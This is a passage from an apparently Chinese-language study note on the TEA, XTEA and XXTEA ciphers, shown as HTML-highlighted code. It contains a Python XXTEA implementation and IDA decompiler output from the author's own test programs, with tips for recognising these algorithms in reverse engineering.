class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python版本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">def</span> <span class="token function">MX</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> sum1<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> c_uint32<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>y<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">^</span>y<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">if</span> n<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>z<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">//</span>ne<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">while</span> rounds<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+=</span>deltae<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#e都要32位哦</span><span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>y<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#v[p]=c_uint32(v[p]+c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[(p&amp;3)^e.value]^z.value)))).value).value</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span>p<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuez<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> y<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#v[n-1]=c_uint32(v[n-1]+c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[((n-1)&amp;3)^e.value]^z.value)))).value).value#这里tmd传入的是k[((n-1)&amp;3)啊我草，找了半天！！！</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuez<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>rounds<span class="token operator">-=</span><span class="token number">1</span> <span class="token keyword">else</span><span class="token punctuation">:</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token operator">-</span>nrounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">//</span>nsum1<span class="token punctuation">.</span>value<span class="token operator">=</span>rounds<span class="token operator">*</span>deltay<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>e<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">while</span> rounds<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>e<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#e都要32位哦</span><span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>z<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#y[p]=c_uint32(v[p]-c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[(p&amp;3)^e.value]^z.value)))).value).value</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span>p<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuey<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> z<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#v[n-1]=c_uint32(v[n-1]-c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[((n-1)&amp;3)^e.value]^z.value)))).value).value#这里tmd传入的是k[((n-1)&amp;3)啊我草，找了半天！！！</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuey<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>sum1<span class="token punctuation">.</span>value<span class="token operator">-=</span>deltarounds<span class="token operator">-=</span><span class="token number">1</span> <span class="token keyword">return</span> v    <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>n<span class="token operator">=</span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密前数据:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>res<span class="token operator">=</span>btea<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>res<span class="token operator">=</span>btea<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token operator">-</span>n<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="tea算法在ida中的分析与识别"><a class="markdownIt-Anchor" href="#tea算法在ida中的分析与识别"></a> TEA算法在ida中的分析与识别</h1><ul><li>可能存在针对64bit以及128bit数字的操作(输入的message和key)</li><li>存在先位移，后异或的类似操作。比如((z &gt;&gt; 5 ^ x &lt;&lt;4) ^ (y &lt;&lt; 4 &amp; q &gt;&gt; 5))等混合变换</li><li>全部你一个复杂的混合变换的结构可能会叠加到另一个值上，两者相互叠加(Feistel结构)</li><li>获取密钥的时候，会使用某一个常量值作为下标 (key [ (sum &gt;&gt; 11) &amp; 3])</li><li>一开始会在算法定义一个delta，并且不断参与算法，但是不会受到输入的影响。</li></ul><p>源码在上面已经给出:</p><ul><li>Debug32位，Vs2022</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//IDAmain函数</span><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-28h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-10h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-Ch]</span>  <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C028<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B30<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_411186</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B4C<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110FF</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B68<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>sub_4110CDprintf函数</li><li>sub_411186为Tea_encrypt函数</li><li>sub_4110FF为Tea_decrypt函数</li></ul><p>sub_411186函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// attributes: thunk</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_411186</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_4118D0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_4118D0</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-2Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+E8h] [ebp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+100h] [ebp-8h]</span>  <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C028<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token operator">*</span>a2<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">-=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>    v5 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> v6<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>1640531527为我们xtea算法中的Delta常数</li><li>xtea算法与tea算法不同的是xtea算法的核心算法是在于取轮密钥，而不是像tea算法中，通过常数影响轮密钥</li><li>(v5 + ((v5 &gt;&gt; 5) ^ ( 16 * v5))) 等价于 (v1 + ((v1 &gt;&gt; 5) ^ (v1 &lt;&lt; 4)))其他同理.</li></ul><p>XXTEA算法:</p><ul><li>Debug32位，Vs2022</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//main函数代码</span><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-28h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-10h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-Ch]</span>  <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C029<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B30<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4111E0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B4C<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4111E0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B68<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>sub_4110CD对应printf函数</li><li>sub_4111E0对应的是Tea_encrypt和Tea_decrypt函数</li></ul><p>sub_4111E0函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// attributes: thunk</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_4111E0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_411770</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_411770</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-44h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-44h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+E0h] [ebp-38h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [esp+E0h] [ebp-38h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-2Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-2Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [esp+104h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [esp+110h] [ebp-8h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// [esp+124h] [ebp+Ch]</span>  result <span class="token operator">=</span> <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C029<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span 